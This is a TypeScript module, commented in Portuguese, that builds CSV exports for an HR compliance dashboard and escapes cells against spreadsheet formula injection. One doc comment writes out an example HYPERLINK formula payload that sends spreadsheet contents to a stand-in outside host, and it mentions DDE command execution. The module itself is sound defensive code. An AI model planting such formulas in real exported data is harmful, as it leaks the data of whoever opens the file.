/**
 * Geração de CSV para as exportações do painel.
 *
 * Parece o módulo mais bobo do projeto e é o único com uma execução de código
 * dentro. Três coisas justificam ele existir em vez de um `join(",")` na rota:
 *
 * 1. **Planilha não é texto: é um programa.** Uma célula que começa com `=`
 *    vira fórmula quando o arquivo abre no Excel. Ver `escaparFormula`.
 * 2. **O Excel brasileiro não lê vírgula.** Ver `SEPARADOR` e `BOM`.
 * 3. **Nome de gente tem vírgula, aspas e acento.** Ver `celulaCsv`.
 *
 * Tudo aqui é função pura, sem banco e sem framework, porque é o tipo de regra
 * que só se confere com uma tabela de casos — e ela está em `tests/csv.test.ts`.
 */

/**
 * Ponto e vírgula, não vírgula.
 *
 * O Excel usa o separador de lista do sistema, e no Windows em português esse
 * separador é `;` — consequência de a vírgula ser o separador decimal daqui.
 * Um arquivo separado por vírgula abre com TODAS as colunas empilhadas numa
 * só, e quem recebe conclui que a exportação está quebrada.
 *
 * É a escolha certa para o destino real destes arquivos: RH e auditoria abrem
 * no Excel, em português, com dois cliques. Quem for ler por programa lida com
 * o separador sem reclamar; o contrário não é verdade.
 */
export const SEPARADOR = ";";

/**
 * Marca de ordem de bytes, na frente do arquivo.
 *
 * Sem ela o Excel não assume UTF-8: lê os bytes na codificação local e
 * "Conceição" chega como "ConceiÃ§Ã£o". Numa rede hoteleira, com Sebastião,
 * Conceição e Antônio em toda folha, é a diferença entre um relatório que se
 * apresenta e um que envergonha.
 *
 * Não atrapalha quem lê por programa: é um caractere invisível que a maioria
 * dos leitores de CSV descarta.
 */
export const BOM = "\uFEFF";

/** RFC 4180 pede CRLF, e é o que o Excel espera. */
const FIM_DE_LINHA = "\r\n";

/**
 * Caracteres que, no começo de uma célula, fazem a planilha tratá-la como
 * fórmula: `=SOMA(...)`, `+1`, `-1`, `@import`.
 *
 * Tabulação e retorno de carro entram porque alguns programas os descartam ao
 * abrir e revelam o caractere seguinte — um `\t=cmd` viraria `=cmd`.
 */
const INICIOS_DE_FORMULA = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Neutraliza uma célula que a planilha executaria.
 *
 * **O ataque.** Alguém se cadastra — ou é cadastrado pela sincronização com a
 * intranet, que é a via realista aqui, porque aqueles nomes vêm de um banco
 * que esta plataforma não controla — com o nome
 * `=HYPERLINK("http://fora/?x"&A1;"Clique")`. O RH exporta a conformidade e
 * abre no Excel. A célula não é mais um nome: é um link que carrega o conteúdo
 * da planilha para fora quando alguém clica. Variações do mesmo truque chamam
 * `DDE` e chegam a executar comando local; o Excel moderno pergunta antes, mas
 * a pergunta é justamente aquela que todo mundo aceita sem ler.
 *
 * **A defesa.** Um apóstrofo na frente. O Excel o interpreta como "isto é
 * texto", não o mostra na célula e não o inclui ao copiar — o leitor vê o nome
 * exatamente como ele é. Só quem for ler o arquivo por programa enxerga o
 * caractere a mais, e é o preço mais barato disponível.
 *
 * Não se tenta adivinhar se a fórmula é perigosa. Não há lista de fórmulas
 * boas: o que importa é que a célula deixe de ser executável, e o que a torna
 * executável é o primeiro caractere.
 */
export function escaparFormula(texto: string): string {
  if (texto === "") return texto;
  return INICIOS_DE_FORMULA.includes(texto[0]) ? `'${texto}` : texto;
}

/**
 * Uma célula, pronta para entrar na linha.
 *
 * Cita quando o conteúdo tem separador, aspas ou quebra de linha, e dobra as
 * aspas de dentro, como manda a RFC 4180. Sem isso um endereço com `;` ou uma
 * observação com quebra de linha desloca todas as colunas seguintes daquela
 * linha — e o estrago é silencioso: o arquivo abre, só está errado.
 */
export function celulaCsv(valor: unknown): string {
  if (valor === null || valor === undefined) return "";

  const texto = escaparFormula(String(valor));

  // A citação vem DEPOIS do escape de fórmula: o apóstrofo precisa ficar
  // dentro das aspas, senão ele mesmo quebra a célula.
  const precisaCitar =
    texto.includes(SEPARADOR) ||
    texto.includes('"') ||
    texto.includes("\n") ||
    texto.includes("\r");

  return precisaCitar ? `"${texto.replaceAll('"', '""')}"` : texto;
}

/** Uma linha inteira, já com o separador entre as células. */
export function linhaCsv(campos: readonly unknown[]): string {
  return campos.map(celulaCsv).join(SEPARADOR);
}

/**
 * O arquivo completo: BOM, cabeçalho e linhas.
 *
 * O cabeçalho passa pelo mesmo tratamento das células. Ele é escrito aqui
 * dentro do código, então não deveria ter surpresa — mas tratá-lo diferente
 * criaria dois caminhos onde um basta.
 */
export function gerarCsv(cabecalho: readonly string[], linhas: readonly (readonly unknown[])[]): string {
  const corpo = [linhaCsv(cabecalho), ...linhas.map(linhaCsv)];
  // Termina com quebra de linha: arquivo sem ela faz alguns leitores
  // engolirem a última linha, que num relatório é uma pessoa a menos.
  return BOM + corpo.join(FIM_DE_LINHA) + FIM_DE_LINHA;
}

/* ------------------------------------------------------- formatos de célula */

/**
 * Data no formato que o Excel em português reconhece como data de verdade.
 *
 * `dd/mm/aaaa` entra como data e permite ordenar e filtrar por período na
 * planilha. Em ISO (`aaaa-mm-dd`) o Excel brasileiro trata como texto, e um
 * prazo que não ordena não serve para cobrar ninguém.
 *
 * Fuso de São Paulo, e não o do servidor: a hospedagem roda em UTC, e um
 * vencimento de 31/03 às 21h vira 01/04 se a conversão não for explícita —
 * data errada em relatório de prazo é a pior espécie de erro pequeno.
 */
export function dataCsv(data: Date | null | undefined): string {
  if (!data) return "";
  return new Intl.DateTimeFormat("pt-BR", {
    timeZone: "America/Sao_Paulo",
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
  }).format(data);
}

/** Data e hora, para as colunas em que a hora importa (aceite, acesso). */
export function dataHoraCsv(data: Date | null | undefined): string {
  if (!data) return "";
  return new Intl.DateTimeFormat("pt-BR", {
    timeZone: "America/Sao_Paulo",
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  }).format(data);
}

/**
 * "Sim"/"Não" em vez de true/false.
 *
 * Quem lê a planilha é o RH, não um programa. E `VERDADEIRO`/`FALSO` — o que o
 * Excel mostraria — é pior que ambos.
 */
export function simNaoCsv(valor: boolean): string {
  return valor ? "Sim" : "Não";
}

/**
 * Nome de arquivo seguro para o cabeçalho `content-disposition`.
 *
 * O nome carrega o filtro aplicado (`conformidade-recepcao-2026-09-12.csv`), e
 * esse pedaço vem do banco. Aspas ou quebra de linha ali permitiriam encerrar
 * o valor e acrescentar outro cabeçalho na resposta; sobra só o que é
 * inofensivo, e o acento sai porque nem todo cliente concorda sobre como
 * decodificá-lo.
 */
export function nomeDeArquivoCsv(partes: readonly (string | null | undefined)[]): string {
  const juntas = partes
    .filter((p): p is string => typeof p === "string" && p.trim() !== "")
    .join("-");

  const limpo = juntas
    .normalize("NFD")
    .replace(/[\u0300-\u036f]/g, "")
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "");

  return `${limpo || "relatorio"}.csv`;
}

/**
 * A resposta HTTP de um CSV.
 *
 * `attachment` para o navegador baixar em vez de tentar exibir. `no-store`
 * pelo mesmo motivo do PDF de auditoria: o arquivo afirma uma situação numa
 * data, e servir o de ontem é pior do que não servir.
 */
export function respostaCsv(nomeDoArquivo: string, conteudo: string): Response {
  return new Response(conteudo, {
    headers: {
      "content-type": "text/csv; charset=utf-8",
      "content-disposition": `attachment; filename="${nomeDoArquivo}"`,
      "cache-control": "no-store",
    },
  });
}
